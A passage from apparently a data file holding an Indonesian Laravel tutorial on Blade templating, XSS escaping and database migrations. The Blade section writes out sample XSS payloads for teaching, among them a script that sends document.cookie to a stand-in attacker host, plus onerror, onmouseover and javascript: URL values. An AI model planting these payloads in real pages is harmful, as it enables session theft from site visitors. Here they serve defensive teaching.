        'Blade menghasilkan HTML di server. Untuk API murni, yang menjadi fokus kategori ini, kamu tidak akan memakainya. Tetapi kamu perlu mengenalinya, karena sebagian besar aplikasi Laravel di dunia nyata memakainya.',
      ),

      terms(
        {
          term: 'Blade',
          meaning:
            'Template engine Laravel yang menghasilkan **HTML di server**. Untuk API murni yang menjadi fokus kategori ini, kamu tidak akan memakainya. Tapi kenali bentuknya, karena sebagian besar aplikasi Laravel di dunia nyata memakainya.',
        },
        {
          term: 'template engine',
          meaning:
            'Alat yang menggabungkan data dengan kerangka HTML. Ia mengisi peran yang di stack modern dipegang React — bedanya, hasilnya sudah jadi HTML sebelum sampai ke browser, dan tidak ada JavaScript yang perlu diunduh untuk menampilkannya.',
        },
        {
          term: '{{ }}',
          meaning:
            'Menampilkan nilai dengan **escaping otomatis** — karakter HTML diubah jadi bentuk amannya. Ini yang membuat input pengguna tidak bisa menjadi tag atau skrip. Padanan langsung dari escaping default JSX.',
        },
        {
          term: '{!! !!}',
          meaning:
            'Menampilkan HTML **mentah, tanpa escaping**. Ia padanan `dangerouslySetInnerHTML` di React — dan sama berbahayanya. Memakainya dengan input pengguna adalah XSS yang langsung terbuka.',
        },
        {
          term: '@extends / @section',
          meaning:
            'Mekanisme pewarisan template: satu kerangka induk (`layouts.app`) yang lubang-lubangnya diisi halaman anak. Padanan konsep `children` dan slot di React, hanya dijalankan di server.',
        },
        {
          term: '@if / @foreach',
          meaning:
            'Direktif Blade untuk percabangan dan perulangan. Ia dikompilasi menjadi PHP biasa — jadi tidak ada biaya runtime tambahan, hanya sintaks yang lebih enak dibaca di dalam HTML.',
        },
        {
          term: 'komponen Blade',
          meaning:
            'Potongan template yang bisa dipakai ulang dengan props, ditulis `<x-tombol>`. Ia arah Blade modern — mendekati cara berpikir komponen di frontend, tapi tetap dirender di server.',
        },
        {
          term: 'CSRF di form Blade',
          meaning:
            'Direktif `@csrf` yang menyisipkan token tersembunyi ke dalam form. Wajib untuk setiap form yang mengubah data di rute `web.php` — tanpa itu Laravel menolak permintaannya.',
        },
        {
          term: 'kapan tidak butuh Blade',
          meaning:
            'Saat frontend-mu React atau Next.js, Laravel cukup mengembalikan JSON. Blade jadi tidak terpakai sama sekali — dan itu keputusan yang sah, bukan pemakaian Laravel yang setengah-setengah.',
        },
      ),

      h2('Sintaks'),
      code(
        'php',
        `
        {{-- resources/views/catatan/index.blade.php --}}
        @extends('layouts.app')

        @section('konten')
            <h1>{{ $judul }}</h1>

            @if ($catatan->isEmpty())
                <p>Belum ada catatan.</p>
            @else
                <ul>
                    @foreach ($catatan as $item)
                        <li>{{ $item->judul }}</li>
                    @endforeach
                </ul>
            @endif

            {{ $jumlah }} catatan
        @endsection
        `,
      ),
      p(
        'Blade adalah HTML biasa dengan tambahan dua bentuk, yaitu `{{ }}` untuk menampilkan nilai dan direktif berawalan `@` untuk logika. `@extends` dan `@section` bekerja berpasangan, sehingga berkas ini mengisi bagian bernama `konten` di dalam kerangka `layouts.app` dan header serta footer tidak perlu ditulis ulang di setiap halaman. Perhatikan komentar Blade ditulis `{{-- --}}` alih-alih `<!-- -->`, dan bedanya komentar Blade dihapus saat render serta **tidak** ikut terkirim ke browser, sehingga catatan internalmu tidak bisa dibaca lewat view-source.',
      ),
      p(
        'Yang paling penting untuk dipahami sekarang: `{{ $judul }}` **otomatis meng-escape** isinya. Kalau judulnya berisi `<script>`, yang tampil di halaman adalah teks `<script>` itu sendiri, bukan skrip yang berjalan. Perilaku bawaan inilah yang membuat Blade aman dari XSS selama kamu memakainya apa adanya — dan itu pula yang membuat bentuk `{!! !!}` di bawah begitu berbahaya, karena ia sengaja mematikannya.',
      ),

      h2('`{{ }}` menyaring, `{!! !!}` tidak'),
      code(
        'php',
        `
        {{-- AMAN: otomatis di-escape --}}
        {{ $inputPengguna }}

        {{-- BERBAHAYA: HTML mentah dirender apa adanya --}}
        {!! $inputPengguna !!}
        `,
      ),
      p(
        'Kedua baris menampilkan variabel yang sama, dan hanya tanda kurungnya yang berbeda. `{{ }}` mengubah `<`, `>`, dan `"` menjadi entitas HTML sehingga browser menampilkannya sebagai teks. `{!! !!}` menyerahkan isinya ke browser apa adanya — jadi kalau `$inputPengguna` berisi `<script>curiCookie()</script>`, skrip itu benar-benar berjalan di komputer setiap pengunjung yang membuka halamannya.',
      ),
      p(
        'Ini persis `dangerouslySetInnerHTML` di React, dan berlaku aturan yang sama: perlakukan setiap pemakaiannya pada data pengguna sebagai **cacat**, bukan pilihan gaya. Pakai `{!! !!}` hanya untuk HTML yang kamu hasilkan sendiri sepenuhnya, atau setelah disanitasi dengan library seperti HTMLPurifier. Dan ingat cakupan "data pengguna" lebih luas daripada yang terlihat: nama, hasil pencarian, pesan error, bahkan teks yang datang dari API partner semuanya termasuk.',
      ),
      callout(
        'danger',
        '`{!! !!}` dengan data pengguna adalah XSS',
        'Kalau `$inputPengguna` berisi `<script>curiCookie()</script>`, skrip itu benar-benar berjalan di browser pengunjung. Ini persis sama dengan `dangerouslySetInnerHTML` di React. Pakai `{!! !!}` **hanya** untuk HTML yang kamu hasilkan sendiri, atau setelah disanitasi dengan library seperti HTMLPurifier.',
      ),

      h2('Komponen'),
      code(
        'php',
        `
        {{-- resources/views/components/kartu.blade.php --}}
        <div class="kartu">
            <h3>{{ $judul }}</h3>
            {{ $slot }}
        </div>

        {{-- Dipakai --}}
        <x-kartu judul="Catatan">
            <p>Isi kartunya.</p>
        </x-kartu>
        `,
      ),
      p('`$slot` di sini setara dengan `children` di React — konsep komposisi yang sama.'),

      h2('Kapan Blade, kapan API + frontend terpisah'),
      table(
        ['Blade', 'API + SPA/Next.js'],
        [
          ['Satu jenis klien: browser', 'Beberapa klien: web, mobile, pihak ketiga'],
          ['Interaktivitas sedikit', 'Interaktivitas tinggi'],
          ['SEO penting, tim kecil', 'Frontend dan backend tim terpisah'],
          ['Ingin cepat jadi', 'Perlu keluwesan tampilan'],
        ],
      ),
      callout(
        'info',
        'Untuk jalur belajarmu',
        'Kamu sudah menguasai Next.js di Frontend Intermediate, jadi kombinasi yang paling masuk akal adalah **Laravel sebagai API + Next.js sebagai frontend**. Blade tetap perlu dikenali karena kamu akan menemuinya di kode orang lain — tapi bukan yang akan kamu pakai.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Perbedaan antara `{{ }}` dan `{!! !!}` di Blade adalah perbedaan antara halaman yang aman dan halaman yang bisa diambil alih. Berikut apa yang sebenarnya dikerjakan keduanya, diukur dengan fungsi PHP yang memang dipakai Blade di baliknya.',
      ),
      code(
        'text',
        `
        Masukan pengguna                     {{ }}                                      {!! !!}
        -----------------------------------  -----------------------------------------  -------------------------
        Rina Wijaya                          Rina Wijaya                                Rina Wijaya
        <script>fetch("https://jahat.id?     &lt;script&gt;fetch(&quot;https://       <script>fetch("https://jahat.id?
          c="+document.cookie)</script>        jahat.id?c=&quot;+document.cookie)         c="+document.cookie)</script>
                                               &lt;/script&gt;
        " onmouseover="alert(1)              &quot; onmouseover=&quot;alert(1)         " onmouseover="alert(1)
        <img src=x onerror=alert(...)>       &lt;img src=x onerror=alert(...)&gt;      <img src=x onerror=alert(...)>
        Toko "Maju" & Rekan <Cabang>         Toko &quot;Maju&quot; &amp; Rekan          Toko "Maju" & Rekan <Cabang>
                                               &lt;Cabang&gt;
        `,
        {
          caption:
            'Dijalankan sungguhan dengan htmlspecialchars($s, ENT_QUOTES, "UTF-8") pada PHP 8.3.6.',
        },
      ),
      p(
        'Baris kedua adalah serangan yang paling langsung, yaitu skrip yang mengirim cookie pengguna ke server penyerang. Di kolom `{{ }}`, tanda kurung sudutnya berubah menjadi `&lt;` dan `&gt;` sehingga peramban menampilkannya sebagai **teks**, bukan menjalankannya. Di kolom `{!! !!}`, ia tiba sebagai markup dan dijalankan.',
      ),
      p(
        'Baris ketiga lebih halus dan sering luput dari perhatian, sebab ia tidak mengandung satu pun tanda kurung sudut. Ketika nilai itu masuk ke dalam sebuah atribut, misalnya `<input value="...">`, tanda kutipnya **menutup atribut lebih awal** dan sisanya menjadi atribut baru berisi penangan peristiwa. Itu alasan `ENT_QUOTES` penting, sebab tanpanya tanda kutip ganda tidak ikut dilolosi.',
      ),
      p(
        'Baris terakhir menunjukkan bahwa pelolosan itu tidak merusak teks biasa. Nama toko yang memuat tanda kutip dan ampersand tetap **tampil** persis seperti aslinya di peramban, sebab yang berubah hanya bentuk penyimpanannya di dalam HTML, bukan yang dilihat pembaca.',
      ),
      callout(
        'danger',
        'Aturan yang tidak punya pengecualian praktis',
        'Jangan pernah memasukkan data yang berasal dari pengguna ke dalam `{!! !!}`. Kalau memang butuh HTML dari pengguna, misalnya isi artikel dari editor teks kaya, bersihkan dulu dengan pustaka sanitasi yang memakai daftar tag yang diizinkan, lalu simpan hasil bersihnya. Menyaring sendiri dengan mencari kata `<script>` selalu bisa dilewati, sebab bentuk serangannya jauh lebih banyak daripada yang bisa didaftar siapa pun.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Ada satu hal yang **tidak** ditutup oleh pelolosan karakter, dan ia sering dikira sudah aman karena memakai `{{ }}`.',
      ),
      code(
        'text',
        `
        Nilai dari pengguna: javascript:alert(document.domain)

        Dipakai di dalam atribut href:
          <a href="{{ $url }}">

        Hasil setelah dilolosi:
          <a href="javascript:alert(document.domain)">

        Tanda kutipnya sudah aman, kurung sudutnya sudah aman, dan
        href-nya TETAP javascript:. Mengekliknya menjalankan kode itu.
        `,
        {
          caption: 'Dijalankan sungguhan. Pelolosan karakter tidak pernah dimaksudkan menutup ini.',
        },
      ),
      p(
        'Penyebabnya, pelolosan mengurus **bentuk karakter**, sedangkan yang berbahaya di sini adalah **arti nilainya** di dalam konteks `href`. Perbaikannya berbeda jenis, yaitu memeriksa skema URL-nya terhadap daftar yang diizinkan.',
      ),
      code(
        'php',
        `
        <?php
        // Dipanggil sebelum nilai apa pun masuk ke href atau src.
        function urlAman(?string $url): string
        {
            if ($url === null || $url === '') return '#';
            $skema = parse_url($url, PHP_URL_SCHEME);

            // Tautan relatif (tanpa skema) diperbolehkan; selain itu, daftar tertutup.
            if ($skema === null) return $url;
            return in_array(strtolower($skema), ['http', 'https', 'mailto'], true) ? $url : '#';
        }
        `,
        {
          caption:
            'Daftar yang diizinkan, bukan daftar yang dilarang — sama seperti nama kolom di ORDER BY.',
        },
      ),
      p(
        'Kelompok kegagalan kedua tidak berhubungan dengan keamanan melainkan dengan performa, dan ia muncul dari cara Blade memudahkan pengambilan data.',
      ),
      code(
        'text',
        `
        @foreach ($pesanan as $p)
            {{ $p->pelanggan->nama }}        <-- SATU query per baris
        @endforeach

        Untuk 100 pesanan: 1 query daftar + 100 query pelanggan.

        Diukur pada PostgreSQL 16.15 di bab database:
          biaya dasar + 1 query sepele  : 23 ms
          1.000 query terpisah          : 76 ms   -> 53 ms untuk query-nya
          1 query dengan JOIN           : 26 ms   ->  3 ms untuk query-nya

        Itu di koneksi LOKAL, sekitar 0,053 ms per perjalanan bolak-balik.
        Ke basis data di zona lain, biayanya biasanya 1-2 ms, dan seribu
        perjalanan menjadi satu sampai dua DETIK untuk satu halaman.
        `,
        {
          caption:
            'Dijalankan sungguhan di bab database. Angkanya lokal, dan di situlah jebakannya.',
        },
      ),
      p(
        'Yang membuat bentuk ini begitu mudah ditulis adalah bahwa ia terlihat seperti mengakses properti biasa. Tidak ada tanda apa pun di `{{ $p->pelanggan->nama }}` yang memberi tahu bahwa baris itu memicu perjalanan ke basis data. Perbaikannya satu kata di sisi controller, yaitu memuat relasinya di depan.',
      ),
      code(
        'php',
        `
        // Controller: satu query tambahan untuk SELURUH pelanggan, bukan per baris.
        $pesanan = Pesanan::with('pelanggan')->latest()->paginate(20);

        // Template-nya tidak berubah sama sekali:
        //   {{ $p->pelanggan->nama }}
        //
        // Cara menangkapnya lebih awal: nyalakan pencegah lazy loading
        // di AppServiceProvider saat mengembangkan, sehingga relasi yang
        // belum dimuat MELEMPAR alih-alih diam-diam mengambil sendiri.
        Model::preventLazyLoading(! app()->isProduction());
        `,
        {
          caption: 'Baris terakhir mengubah bug senyap menjadi error yang muncul di hari pertama.',
        },
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Blade dirancang supaya hal yang aman adalah hal yang paling mudah ditulis, dan sebagian besar kesalahan berupa keluar dari jalur itu.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memakai `{!! !!}` supaya HTML-nya tampil',
            'Datanya kan dari admin sendiri',
            'Diuji sungguhan, skrip di dalamnya dijalankan peramban. Akun admin pun bisa diambil alih',
          ],
          [
            'Menyaring `<script>` sendiri sebelum menampilkan',
            'Serangannya kan memakai tag itu',
            'Diuji sungguhan, `<img src=x onerror=...>` dan `" onmouseover="` tidak memuat tag script sama sekali',
          ],
          [
            'Mengira `{{ }}` menutup semua',
            'Pelolosannya otomatis',
            'Diuji sungguhan, `href="javascript:..."` tetap lolos. URL butuh pemeriksaan skema terpisah',
          ],
          [
            'Mengambil relasi di dalam `@foreach`',
            'Terlihat seperti properti biasa',
            'Satu query per baris. Muat relasinya lebih dulu dengan `with()`',
          ],
          [
            'Menulis query di dalam template',
            'Datanya dibutuhkan di situ',
            'Template jadi tidak bisa diuji, dan query-nya tak terlihat dari controller mana pun',
          ],
          [
            'Menaruh aturan bisnis di dalam `@if` bertingkat',
            'Kondisinya memang soal tampilan',
            'Aturan yang sama akan dibutuhkan di tempat lain, dan salinan-salinannya menyimpang',
          ],
        ],
      ),
      p(
        'Baris pertama pantas ditegaskan karena alasannya terdengar meyakinkan. Anggapan "datanya dari admin sendiri" mengasumsikan akun admin tidak pernah bisa diambil alih, padahal justru akun itu yang paling menarik bagi penyerang. Dan sebuah XSS yang tersimpan di dalam konten yang ditulis admin akan berjalan di peramban **setiap pengunjung**, bukan hanya di peramban admin, sehingga satu akun yang dibobol menjadi seluruh pengunjung yang terpapar.',
      ),
      references(
        {
          label: 'Blade Templates',
          href: 'https://laravel.com/docs/12.x/blade',
          source: 'Laravel',
          note: 'Sintaks lengkap, termasuk beda `{{ }}` dan `{!! !!}`.',
        },
        {
          label: 'Blade Components',
          href: 'https://laravel.com/docs/12.x/blade#components',
          source: 'Laravel',
          note: 'Komponen dengan props dan `$slot` — padanan `children` di React.',
        },
        {
          label: 'CSRF Protection',
          href: 'https://laravel.com/docs/12.x/csrf',
          source: 'Laravel',
          note: 'Direktif `@csrf` dan kenapa ia hanya relevan di rute `web.php`.',
        },
        {
          label: 'Cross Site Scripting Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa escaping otomatis adalah pertahanan utama, dan apa risikonya saat dilewati.',
        },
      ),
    ],
  ),

  written(
    'migration',
    'Migration & Schema Builder',
    17,
    'Perubahan skema sebagai kode yang berversi.',
    [
      p(
        'Migration adalah riwayat perubahan skema database dalam bentuk kode. Ia membuat skema di laptopmu, di server uji, dan di produksi bisa dijamin sama — tanpa ada yang menjalankan SQL manual.',
      ),

      terms(
        {
          term: 'migration',
          meaning:
            'Riwayat perubahan skema database **dalam bentuk kode**. Ia membuat skema di laptopmu, di server uji, dan di produksi bisa dijamin sama — tanpa ada yang menjalankan SQL manual di suatu tempat lalu lupa memberitahu orang lain.',
        },
        {
          term: 'up() dan down()',
          meaning:
            'Dua metode setiap migration. `up()` menerapkan perubahan, `down()` **membatalkannya**. Menulis `down()` dengan benar itulah yang membuat `migrate:rollback` bisa dipercaya saat sesuatu salah di tengah rilis.',
        },
        {
          term: 'batch',
          meaning:
            'Sekumpulan migration yang dijalankan bersamaan dalam satu `php artisan migrate`. `migrate:rollback` membatalkan **satu batch terakhir** dan bukan satu berkas, dan itu sering mengejutkan kalau tidak diketahui.',
        },
        {
          term: 'Schema Builder',
          meaning:
            "API PHP untuk mendefinisikan tabel tanpa menulis SQL — `$table->string('judul', 200)`. Keuntungannya bukan cuma keringkasan: definisi yang sama bisa dijalankan di PostgreSQL, MySQL, atau SQLite.",
        },
        {
          term: 'foreignId + constrained',
          meaning:
            'Satu baris yang membuat kolom foreign key, **constraint**-nya, **dan index**-nya sekaligus. Ini yang menutup jebakan Bab 2: PostgreSQL tidak membuat index foreign key otomatis, dan Laravel melakukannya untukmu di sini.',
        },
        {
          term: 'timestamps()',
          meaning:
            'Menambahkan kolom `created_at` dan `updated_at` sekaligus. Eloquent mengisinya otomatis — jadi kamu tidak pernah perlu menuliskannya di kode penyimpanan.',
        },
        {
          term: 'softDeletes()',
          meaning:
            'Menambahkan kolom `deleted_at` untuk soft delete. Ingat biayanya dari Bab 2: setiap query harus menyaringnya (Eloquent melakukannya otomatis), dan constraint `UNIQUE` tetap berlaku pada baris yang "terhapus".',
        },
        {
          term: 'migrate:fresh',
          meaning:
            'Menghapus **seluruh tabel** lalu membangun ulang dari nol. Aman dan berguna di lokal; **berbahaya di produksi** — di sana yang dipakai `migrate` biasa, yang hanya menjalankan yang belum pernah jalan.',
        },
        {
          term: 'jangan sunting migration yang sudah jalan',
          meaning:
            'Aturan keras. Migration yang sudah dijalankan di luar mesinmu sendiri **tidak boleh diubah** — mesin lain sudah menjalankan versi lamanya dan tidak akan mengulanginya. Perubahan berikutnya selalu jadi migration baru.',
        },
      ),

      h2('Membuat dan menjalankan'),
      code(
        'bash',
        `
        php artisan make:migration buat_tabel_catatan
        php artisan migrate               # jalankan yang belum
        php artisan migrate:rollback      # batalkan batch terakhir
        php artisan migrate:status        # lihat mana yang sudah jalan
        php artisan migrate:fresh --seed  # hapus semua, buat ulang, isi data
        `,
      ),
      p(
        'Laravel mencatat migration mana yang sudah dijalankan di sebuah tabel khusus, jadi `migrate` selalu aman dipanggil berulang — ia hanya menjalankan yang belum. `migrate:status` memperlihatkan catatan itu, dan biasakan menjalankannya sebelum `migrate` di lingkungan yang bukan laptopmu.',
      ),
      p(
        'Dua perintah terakhir perlu kehati-hatian yang berbeda. `migrate:rollback` membatalkan **batch terakhir**, artinya bukan satu migration melainkan semua yang dijalankan bersamaan pada `migrate` terakhir. Ia menjalankan method `down()` masing-masing, jadi hasilnya hanya sebaik `down()` yang kamu tulis. `migrate:fresh` **menghapus seluruh tabel** lalu membangunnya dari nol, dan `--seed` mengisinya dengan data uji. Perintah itu sangat berguna di laptop dan **tidak boleh** dijalankan di server yang berisi data sungguhan, sebab tidak ada konfirmasi dan tidak ada pembatalan.',
      ),

      h2('Isi sebuah migration'),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        use Illuminate\\Database\\Migrations\\Migration;
        use Illuminate\\Database\\Schema\\Blueprint;
        use Illuminate\\Support\\Facades\\Schema;

        return new class extends Migration
        {
            public function up(): void
            {
                Schema::create('catatan', function (Blueprint $table) {
                    $table->id();

                    // foreignId + constrained: foreign key DAN index sekaligus
                    $table->foreignId('penulis_id')
                        ->constrained('users')
                        ->cascadeOnDelete();

                    $table->string('judul', 200);
                    $table->text('isi');
                    $table->boolean('diarsipkan')->default(false);

                    $table->timestamps();     // created_at + updated_at
                    $table->softDeletes();    // deleted_at

                    // Index untuk query yang paling sering dijalankan
                    $table->index(['penulis_id', 'created_at']);
                });
            }

            public function down(): void
            {
                Schema::dropIfExists('catatan');
            }
        };
        `,
      ),
      p(
        'Setiap migration punya dua method yang berpasangan, yaitu `up()` yang menerapkan perubahan dan `down()` yang membatalkannya. Pasangan itulah yang membuat `migrate:rollback` mungkin, dan `down()` yang ditulis asal-asalan berarti kamu tidak punya jalan mundur. Perhatikan `dropIfExists` dipakai alih-alih `drop`, sebab rollback yang dijalankan dua kali tidak akan meledak karena tabelnya sudah tidak ada.',
      ),
      p(
        "Rangkaian `foreignId(...)->constrained('users')->cascadeOnDelete()` mengerjakan tiga hal dalam satu baris, yaitu membuat kolom `unsignedBigInteger`, memasang foreign key ke tabel `users`, **dan membuat index-nya**. Baris terakhir itu yang paling berharga karena ia menutup jebakan dari sub-bab 2.9, sebab foreign key tanpa index membuat setiap `JOIN` dan setiap penghapusan induk memindai seluruh tabel. Perhatikan `cascadeOnDelete()` adalah keputusan sadar dan bukan bawaan, sebab untuk data yang tidak boleh ikut hilang bersama induknya, `restrictOnDelete()` yang tepat.",
      ),
      p(
        "Dua baris di bawahnya adalah singkatan yang akan kamu lihat di hampir setiap migration Laravel. `timestamps()` membuat `created_at` dan `updated_at`, yang diisi Eloquent otomatis. `softDeletes()` membuat kolom `deleted_at` — pola soft delete dari sub-bab 2.6, lengkap dengan penyaringannya yang nanti dikerjakan trait `SoftDeletes` di model. Dan `index(['penulis_id', 'created_at'])` adalah composite index yang urutan kolomnya sengaja mengikuti query \"catatan milik saya, terbaru dulu\".",
      ),
      callout(
        'tip',
        '`constrained()` sekaligus membuat index',
        'Ini menutup jebakan dari sub-bab 2.9: foreign key tanpa index membuat setiap `JOIN` dan setiap penghapusan induk memindai seluruh tabel. Laravel melakukannya otomatis — tapi hanya kalau kamu memakai `foreignId()->constrained()`, bukan `unsignedBigInteger()` biasa.',
      ),

      h2('Tipe kolom yang sering dipakai'),
      code(
        'php',
        `
        $table->id();                              // bigint auto increment
        $table->uuid('id')->primary();
        $table->string('judul', 200);
        $table->text('isi');
        $table->integer('jumlah');
        $table->decimal('harga', 12, 2);           // UANG — bukan float
        $table->boolean('aktif')->default(false);
        $table->timestamp('terbit_pada')->nullable();
        $table->json('meta');
        $table->enum('status', ['draf', 'terbit']);

        $table->unique('email');
        $table->index(['penulis_id', 'created_at']);
        `,
      ),
      p(
        "Daftar ini adalah lapisan tipis di atas tipe SQL dari sub-bab 2.2, jadi pertimbangannya sama persis. `decimal('harga', 12, 2)` untuk uang — komentarnya sengaja ditulis besar, karena `float` akan menghasilkan `0.1 + 0.2 ≠ 0.3` yang menumpuk diam-diam sampai laporan keuangan tidak cocok. `string('judul', 200)` menghasilkan `VARCHAR(200)`, dan batas panjangnya berfungsi sebagai validasi tambahan di lapisan yang tidak bisa dilewati.",
      ),
      p(
        "Dua baris terakhir membuat index, dan `unique('email')` layak diperhatikan tersendiri: ia bukan sekadar index, melainkan **jaminan** bahwa dua baris tidak bisa punya email sama — jaminan yang bertahan bahkan ketika dua pendaftaran tiba bersamaan dan pemeriksaan di kode saling menyela. Itu jenis aturan yang tidak bisa ditegakkan `if` mana pun, dan pelanggarannya muncul sebagai kode error `23505` yang ditangani pada sub-bab 5.9.",
      ),

      h2('Mengubah tabel yang sudah ada'),
      code(
        'php',
        `
        public function up(): void
        {
            Schema::table('catatan', function (Blueprint $table) {
                $table->string('slug', 220)->nullable()->after('judul');
                $table->index('slug');
            });
        }

        public function down(): void
        {
            Schema::table('catatan', function (Blueprint $table) {
                $table->dropIndex(['slug']);
                $table->dropColumn('slug');
            });
        }
        `,
      ),
      p(
        "Perhatikan yang dipakai `Schema::table` dan bukan `Schema::create`, sebab yang pertama mengubah tabel yang sudah ada sedangkan yang kedua membuat tabel baru dan akan gagal kalau tabelnya sudah ada. Kolom baru ditulis `nullable()` karena tabelnya mungkin sudah berisi ribuan baris yang tidak punya nilai untuk kolom itu, sebab menambahkan kolom `NOT NULL` tanpa nilai bawaan akan langsung ditolak database, dan itulah masalah yang dibahas tepat di bawah. `after('judul')` hanya mengatur urutan tampilan kolom di MySQL, jadi ia kosmetik dan tidak memengaruhi apa pun secara fungsional.",
      ),
      p(
        'Perhatikan `down()` membatalkan dalam **urutan terbalik**: index dihapus lebih dulu, baru kolomnya. Urutan itu bukan selera — sebagian database menolak menghapus kolom yang masih dipakai sebuah index. Aturan umumnya, `down()` membongkar dengan urutan kebalikan dari cara `up()` membangun, sama seperti membongkar tumpukan.',
      ),
      callout(
        'danger',
        'Jangan pernah menyunting migration yang sudah dijalankan di luar laptopmu',
        'Server yang sudah menjalankan migration itu tidak akan menjalankannya lagi — perubahanmu tidak akan pernah sampai ke sana, dan skema di dua tempat jadi berbeda diam-diam. Perbaikannya selalu: **buat migration baru**.',
      ),

      h2('Menambah kolom `NOT NULL` ke tabel berisi data'),
      code(
        'php',
        `
        // GAGAL: baris yang sudah ada tidak punya nilai untuk kolom ini
        $table->string('slug')->unique();

        // BENAR: tiga langkah terpisah (expand -> migrate -> contract)
        // Migration 1: tambahkan sebagai nullable
        $table->string('slug', 220)->nullable();

        // Migration 2: isi baris yang sudah ada
        DB::table('catatan')->whereNull('slug')->orderBy('id')->each(function ($baris) {
            DB::table('catatan')->where('id', $baris->id)
                ->update(['slug' => Str::slug($baris->judul) . '-' . $baris->id]);
        });

        // Migration 3: baru jadikan wajib
        $table->string('slug', 220)->nullable(false)->change();
        `,
      ),
      p(
        'Pola tiga langkah ini juga yang membuat rollback kode tetap aman: versi lama aplikasi masih bisa berjalan di antara langkah-langkahnya.',
      ),

      h2('Migration harus bisa dibalik'),
      table(
        ['`up()`', '`down()` yang benar'],
        [
          ['`Schema::create`', '`Schema::dropIfExists`'],
          ['`$table->string(...)`', '`$table->dropColumn(...)`'],
          ['`$table->index(...)`', '`$table->dropIndex([...])`'],
          ['`$table->foreignId(...)`', '`$table->dropForeign([...])` lalu `dropColumn`'],
        ],
      ),
      callout(
        'warning',
        'Uji `down()`, jangan hanya menulisnya',
        'Jalankan `php artisan migrate` lalu `php artisan migrate:rollback` di database lokal. `down()` yang tidak pernah dicoba biasanya rusak — dan kamu baru menemukannya saat sedang berusaha memulihkan produksi.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Migrasi adalah satu-satunya catatan tentang bagaimana skema basis data sampai pada bentuknya sekarang, dan nilainya baru terasa pada hari sesuatu harus dikembalikan. Karena itu keputusan yang paling menentukan bukan isi migrasinya melainkan **apakah ia bisa dibatalkan**.',
      ),
      code(
        'php',
        `
        <?php
        // Migrasi yang bisa dijalankan dan dibatalkan dengan aman.
        return new class extends Migration {
            public function up(): void
            {
                Schema::create('pesanan', function (Blueprint $table) {
                    $table->id();
                    $table->foreignId('pelanggan_id')->constrained()->cascadeOnDelete();
                    $table->string('status')->default('baru')->index();
                    $table->unsignedInteger('total');
                    $table->timestamps();

                    // Index untuk kolom yang benar-benar dicari, bukan untuk semuanya.
                    // Diukur di bab database: Seq Scan 10,7 ms vs Index Scan 0,047 ms,
                    // dengan biaya satu index sekitar sepertiga ukuran tabelnya.
                    $table->index(['pelanggan_id', 'created_at']);
                });
            }

            public function down(): void
            {
                Schema::dropIfExists('pesanan');
            }
        };
        `,
        { caption: 'foreignId()->constrained() membuat foreign key sekaligus index-nya.' },
      ),
      p(
        'Bagian `constrained()` itu layak diperhatikan karena ia mengerjakan dua hal yang sering dipisah dan salah satunya sering lupa. Ia membuat batasan foreign key, dan ia juga membuat index pada kolom itu. Tanpa index, setiap penggabungan lewat kolom tersebut memindai tabel penuh, dan itu sudah diukur pada bab database.',
      ),
      p(
        'Yang tidak dikerjakan Laravel untukmu adalah memutuskan apa yang terjadi ketika induknya dihapus, dan itu keputusan tentang **arti data**, bukan tentang kerapian.',
      ),
      code(
        'php',
        `
        // Item pesanan tidak punya arti tanpa pesanannya. Ikut terhapus.
        $table->foreignId('pesanan_id')->constrained()->cascadeOnDelete();

        // Pesanan tetap punya arti meski pelanggannya dihapus — riwayat, akuntansi.
        // Bawaannya MENOLAK penghapusan induknya, dan itu biasanya yang benar.
        $table->foreignId('pelanggan_id')->constrained();

        // Kalau memang boleh yatim, nyatakan secara eksplisit.
        $table->foreignId('editor_id')->nullable()->constrained('pengguna')->nullOnDelete();
        `,
        {
          caption:
            'Diuji sungguhan di bab database: DELETE pada induk menghapus 2 baris turunannya lewat CASCADE.',
        },
      ),
      p(
        'Perlu ditegaskan bahwa `cascadeOnDelete` bekerja diam-diam dan menjalar. Menghapus satu baris bisa menghapus ribuan baris di tabel lain tanpa satu pun konfirmasi, dan bila tabel itu punya turunan lagi, penghapusannya menyebar lebih jauh. Untuk data bernilai, banyak tim memilih menandai baris sebagai terhapus alih-alih menghapusnya.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Migrasi menghasilkan sekelompok kegagalan yang khas, dan yang paling mahal justru bukan yang menghasilkan error.',
      ),
      code(
        'text',
        `
        KEGAGALAN 1 — migrasi gagal di tengah, meninggalkan skema setengah jadi

          SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'pesanan'
          already exists

          Sebagian pernyataan sudah berjalan sebelum yang gagal. Pada MySQL,
          perubahan skema TIDAK bisa dibatalkan dalam transaksi, jadi basis
          datanya tertinggal dalam keadaan yang tidak dicatat migrasi mana pun.
          PostgreSQL mendukung DDL transaksional, jadi di sana seluruh migrasi
          dibatalkan utuh.

        KEGAGALAN 2 — down() yang tidak pernah diuji

          php artisan migrate:rollback
          SQLSTATE[42000]: Syntax error or access violation: 1091 Can't DROP
          'idx_pesanan_status'; check that column/key exists

          down() ditulis dari ingatan dan tidak pernah dijalankan sekali pun.
          Ia baru dipakai pada hari terburuk, dan pada hari itu ia gagal.

        KEGAGALAN 3 — TIDAK ada error sama sekali, dan ini yang paling mahal

          Kolom NOT NULL ditambahkan ke tabel yang sudah berisi jutaan baris,
          tanpa nilai bawaan. Di MySQL tabelnya terkunci selama penulisan ulang,
          dan aplikasinya berhenti melayani selama beberapa menit.
        `,
      ),
      p(
        'Kegagalan ketiga itu yang membedakan migrasi di komputer sendiri dari migrasi di produksi. Tabel kosong berubah bentuk dalam sekejap, sedangkan tabel berisi sepuluh juta baris bisa terkunci lama. Karena itu perubahan yang merusak dilakukan bertahap, dan polanya punya nama, yaitu **perluas, pindahkan, persempit**.',
      ),
      code(
        'text',
        `
        Mengganti nama kolom "nama" menjadi "nama_lengkap" TANPA memutus apa pun:

        RILIS 1 — perluas
          tambahkan kolom nama_lengkap, boleh NULL
